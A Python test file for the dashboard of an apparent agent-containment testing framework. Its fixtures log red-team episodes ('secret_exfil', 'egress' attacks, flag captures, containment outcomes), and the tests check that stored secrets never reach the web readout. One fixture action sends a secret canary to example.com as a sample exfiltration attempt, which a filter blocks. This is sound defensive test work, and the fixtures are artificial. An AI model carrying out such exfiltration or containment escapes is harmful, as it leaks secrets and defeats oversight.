"""The dashboard must show outcomes without releasing stored secrets."""

import json
from pathlib import Path
import tempfile
import threading
import unittest
from http.server import ThreadingHTTPServer
from urllib.request import urlopen

from crucible.dashboard import build_snapshot, make_handler
from crucible.experience import ExperienceBank
from crucible.scenarios import CANARY
from crucible.trajectory import TrajectoryStore


class DashboardTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.db_path = Path(self.temp.name) / "bank.sqlite"
        bank = ExperienceBank(self.db_path)
        bank.add_episode({
            "episode_id": "ep_1", "round": 1, "attack_shape": "secret_exfil",
            "flag_captured": False, "safe_action_executed": True, "task_completed": True,
            "final_report": "fixture complete", "execution_mode": "simulate",
            "containment_held": True,
            "worker_trajectory": [{"action": {"kind": "http_get", "payload": {"url": f"https://example.com/?key={CANARY}"}},
                                   "decision": "deny", "by": "D6", "reason": "secret blocked",
                                   "result": {"exit_code": None}}],
            "boundary_verdicts": [], "blue_action": {"plugin_id": "d6_output_filter_v1"},
        })
        bank.add_episode({
            "episode_id": "ep_2", "round": 2, "attack_shape": "egress",
            "flag_captured": True, "flag_verifiable": True,
            "safe_action_executed": False, "task_completed": False, "execution_mode": "docker",
            "containment_held": False,
            "worker_trajectory": [], "boundary_verdicts": [],
        })
        bank.add_episode({
            "episode_id": "ep_3", "round": 3, "attack_shape": "egress",
            "flag_captured": False, "flag_verifiable": True,
            "safe_action_executed": True, "task_completed": True,
            "final_report": "local task complete", "execution_mode": "docker",
            "containment_held": True,
            "worker_trajectory": [], "boundary_verdicts": [],
        })

    def tearDown(self):
        self.temp.cleanup()

    def test_snapshot_curves_and_redaction(self):
        snapshot = build_snapshot(self.db_path)
        self.assertEqual(snapshot["summary"], {"total": 3, "attack_rate": .5,
            "safe_rate": .5, "fixture_rate": 1, "simulated": 1, "docker": 2,
            "remote": 0, "live": 2, "model_live": 2, "probe_live": 0,
            "unverified_docker": 0,
            "unverified_remote": 0, "unverified_live": 0})
        self.assertEqual(len(snapshot["curves"]), 2)
        self.assertEqual(snapshot["curves"][0]["attack_rate"], 1)
        self.assertEqual(snapshot["curves"][1]["safe_rate"], .5)
        self.assertEqual(snapshot["events"][0]["decision"], "deny")
        self.assertEqual(snapshot["events"][0]["mode"], "simulate")
        self.assertNotIn(CANARY, json.dumps(snapshot))

    def test_remote_container_episode_is_counted_and_labelled_separately(self):
        ExperienceBank(self.db_path).add_episode({
            "episode_id": "ep_4", "round": 4, "attack_shape": "egress",
            "flag_captured": False, "flag_verifiable": True,
            "safe_action_executed": True, "task_completed": True,
            "final_report": "remote task complete", "execution_mode": "remote",
            "containment_held": True, "worker_trajectory": [], "boundary_verdicts": [],
        })
        snapshot = build_snapshot(self.db_path)
        self.assertEqual(snapshot["summary"]["docker"], 2)
        self.assertEqual(snapshot["summary"]["remote"], 1)
        self.assertEqual(snapshot["summary"]["live"], 3)
        self.assertAlmostEqual(snapshot["summary"]["safe_rate"], 2 / 3)
        self.assertEqual(snapshot["latest_report"]["mode"], "remote")

    def test_offline_container_probe_does_not_reduce_model_task_rate(self):
        ExperienceBank(self.db_path).add_episode({
            "episode_id": "ep_4", "round": 4, "attack_shape": "egress",
            "flag_captured": False, "flag_verifiable": True,
            "safe_action_executed": False, "task_completed": False,
            "execution_mode": "remote", "worker_mode": "offline",
            "containment_held": True, "worker_trajectory": [],
            "boundary_verdicts": [],
        })
        summary = build_snapshot(self.db_path)["summary"]
        self.assertEqual(summary["live"], 3)
        self.assertEqual(summary["model_live"], 2)
        self.assertEqual(summary["probe_live"], 1)
        self.assertEqual(summary["safe_rate"], 0.5)

    def test_http_readout_has_csp_and_no_secret(self):
        server = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(self.db_path, 20))
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        base = f"http://127.0.0.1:{server.server_port}"
        try:
            with urlopen(base + "/") as response:
                self.assertIn("Content-Security-Policy", response.headers)
                self.assertIn("Containment under pressure", response.read().decode())
            with urlopen(base + "/api/snapshot") as response:
                body = response.read().decode()
                self.assertNotIn(CANARY, body)
                self.assertEqual(json.loads(body)["summary"]["total"], 3)
        finally:
            server.shutdown()
            server.server_close()
            thread.join()

    def test_live_trajectory_snapshot_and_sse_follow_cli_task(self):
        store = TrajectoryStore(self.db_path)
        task_id = store.claim_task()
        store.mark_running(task_id)
        store.append(task_id, "remote_exec", "pending", action="file_read")
        server = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(self.db_path, 20))
        server.daemon_threads = True
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        base = f"http://127.0.0.1:{server.server_port}"
        try:
            with urlopen(base + "/api/trajectory/snapshot") as response:
                snapshot = json.load(response)
            self.assertTrue(snapshot["active"])
            self.assertEqual(snapshot["task_id"], task_id)
            self.assertEqual(snapshot["events"][0]["phase"], "task_start")
            self.assertEqual(snapshot["events"][1]["phase"], "remote_exec")
            self.assertNotIn(CANARY, json.dumps(snapshot))

            after = snapshot["events"][-1]["seq"]
            with urlopen(base + f"/api/trajectory?after={after}", timeout=3) as response:
                self.assertEqual(response.headers.get_content_type(), "text/event-stream")
                store.append(task_id, "preexec", "deny", action="file_read", dimension="D3")
                lines = []
                for _ in range(8):
                    line = response.readline().decode("utf-8")
                    lines.append(line)
                    if line.startswith("data: "):
                        break
                event_line = next(line for line in lines if line.startswith("data: "))
                event = json.loads(event_line[6:])
                self.assertEqual(event["phase"], "preexec")
                self.assertEqual(event["detail"], "file read · D3")
        finally:
            server.shutdown()
            server.server_close()
            thread.join()


if __name__ == "__main__":
    unittest.main()
